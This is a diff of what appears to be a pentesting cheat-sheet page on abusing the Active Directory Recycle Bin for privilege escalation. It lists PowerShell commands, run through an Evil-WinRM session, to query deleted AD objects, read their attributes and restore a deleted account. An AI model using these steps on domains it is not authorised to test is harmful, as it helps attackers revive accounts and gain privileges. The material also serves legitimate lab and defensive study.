@@ -1,25 +1,25 @@
 ---
 title: "AD Recycle Bin"
 date: 2024-7-13
-tags: ["Domain Controller", "AD Recycle Bin", "Active Directory", "Windows"]
+tags: ["Domain Controller", "AD Recycle Bin", "Active Directory", "Windows", "Deleted Objects", "Restore"]
 ---
 
-### Privesc #1: Restore deleted AD account
+### Privesc #1: Restore Deleted AD Object
 
 {{< tab set1 tab1 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-#### 1. Import AD module
+#### 1. Import AD Module
 
 ```console
-import-module activedirectory
+Import-Module activedirectory
 ```
 
 ```console {class="sample-code"}
 *Evil-WinRM* PS C:\Users\test.user\Documents> import-module activedirectory
 ```
 
-#### 2. Query all deleted objects within domain
+#### 2. Query All Deleted Objects within Domain
 
 ```console
 Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
@@ -36,7 +36,7 @@ ObjectClass       : user
 ObjectGUID        : ebe15df5-e265-45ec-b7fc-359877217138
 ```
 
-#### 3. Get all details for the deleted account
+#### 3. Get All Details for the Deleted Object
 
 ```console
 Get-ADObject -filter { SAMAccountName -eq '<DELETED_USER>' } -includeDeletedObjects -property *
@@ -57,7 +57,7 @@ CN                              : Another User
 ---[SNIP]---
 ```
 
-#### 4. Restore the deleted account
+#### 4. Restore the Deleted Object
 
 ```console
 # Rename the target account to avoid user exists error
@@ -66,6 +66,22 @@ Restore-ADObject -Identity <OBJECT_GUID> -NewName '<DELETED_USER>.2' -TargetPath
 
 ```console {class="sample-code"}
 *Evil-WinRM* PS C:\Users\test.user\Documents> Restore-ADObject -Identity ebe15df5-e265-45ec-b7fc-359877217138 -NewName 'Another User2' -TargetPath 'CN=Users,DC=EXAMPLE,DC=COM'
+```
+
+```console
+# Or
+Restore-ADObject -Identity "<DISTINGUISHED_NAME>"
+```
+
+```console
+PS C:\programdata> Restore-ADObject -Identity "CN=Apple Seed\0ADEL:1c6---[SNIP]---9db,CN=Deleted Objects,DC=example,DC=com"
+Restore-ADObject -Identity "CN=Apple Seed\0ADEL:1c6---[SNIP]---9db,CN=Deleted Objects,DC=example,DC=com"
+```
+
+#### 5. Check
+
+```console
+net user <DELETED_USER>
 ```
 
 {{< /tabcontent >}}
